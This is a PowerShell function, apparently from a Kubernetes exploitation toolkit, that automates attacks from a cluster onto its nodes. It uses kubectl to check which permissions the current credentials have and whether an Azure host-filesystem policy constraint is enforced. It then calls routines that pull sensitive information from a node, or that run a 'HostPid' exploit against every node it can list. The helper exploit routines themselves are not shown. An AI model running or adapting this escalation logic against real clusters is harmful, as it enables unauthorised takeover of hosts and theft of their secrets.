Function Test-ExploitabilityToNode {
    [CmdletBinding(SupportsShouldProcess=$true,ConfirmImpact="High")]
    param(
        [Parameter(Mandatory = $false)]
        [Alias("t")]
        [string]$access_token = "nvt"
    )
    # Ensure kubectl is available
    if (Test-KubectlInstalledInPath) {
        exit
    }

    if($PSCmdlet.ShouldProcess("Trying to exploitation to node")){
        Write-Host "Starting to Analyze"
        #validate if there is no constraint implemented for host mounting:
            # Define an array with the actions and resources to check
        $actionResourcePairs = @(
            @{ Action = "create"; Resource = "pods" },
            @{ Action = "get"; Resource = "nodes/debug" },
            @{ Action = "exec"; Resource = "pods" },
            @{ Action = "get"; Resource = "nodes" }

        )
        $AllowedNamespaces = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
        #checking if there are constraints
        Write-Host "Validating for the HostMountFile system constraint and if we can possible bypass it"
        $namespacesWithoutConstraint = Validate-ConstraintAction -ConstraintName "K8sAzureV3HostFilesystem" -EnforcementAction "deny" -NamespacesToCheck $AllowedNamespaces

        if($namespacesWithoutConstraint){
            Write-Host "It looks like we should be allowed to debug the node"
            Get-SensitiveInformationFromNode -namespace $namespacesWithoutConstraint
            return;
        } 
        
        Write-Host "It looks like we aren't able to debug the node directly trying other methods"

        # Define an array with the actions and resources to check
        $actionResourcePairs = @(
            @{ Action = "create"; Resource = "pods" },
            @{ Action = "get"; Resource = "pods/exec" },
            @{ Action = "delete"; Resource = "pods" }
        )
        $AllowedNamespaces = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
        if (-not $AllowedNamespaces) {
            Write-Host "There isn't a namespace where we can create, execute and delete a pod."
            Write-Host "Do we need to validate without delete statemsent? (this results in that the pod will stay in the system. and you have )"
            Write-Host "No ability to delete the pod. without help from others"
            $yesOrNo = Get-YesOrNoInput
            if(-not $yesOrNo){
                return;
            }
                    # Define an array with the actions and resources to check
            $actionResourcePairs = @(
                @{ Action = "create"; Resource = "pods" },
                @{ Action = "get"; Resource = "pods/exec" }
            )
            $AllowedNamespaces = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
            if (-not $AllowedNamespaces) {
                Write-Host "There is still no namespace where we can create and execute a pod."
                return;
                #We could try and find pods we can exec which already have a host mount and privileged, or have hostipc.
            }
        }
        
        $cleanNamespace = $AllowedNamespaces[0].TrimStart('-')
        Write-Host "Looks like we can execute on a pod and create it will be deployed on namespace $cleanNamespace"
        Write-Host "Trying to retrieve all nodes to force deployment on all nodes"
        $result = kubectl auth can-i get node
        if($result -eq "yes"){
            $nodes = kubectl get nodes -o 'jsonpath={.items[*].metadata.name}' 
            $nodes = $nodes -split " "
            foreach($node in $nodes){
                Write-Host found the following nodes:
                Write-Host $node
                Perform-HostPidExploit -namespace $cleanNamespace -node $node
            }
        }
        else {
            Write-Host "Not allowed to list nodes, performing action on a random node."
            Perform-HostPidExploit -namespace $cleanNamespace
        }
        
       

 
    }


}
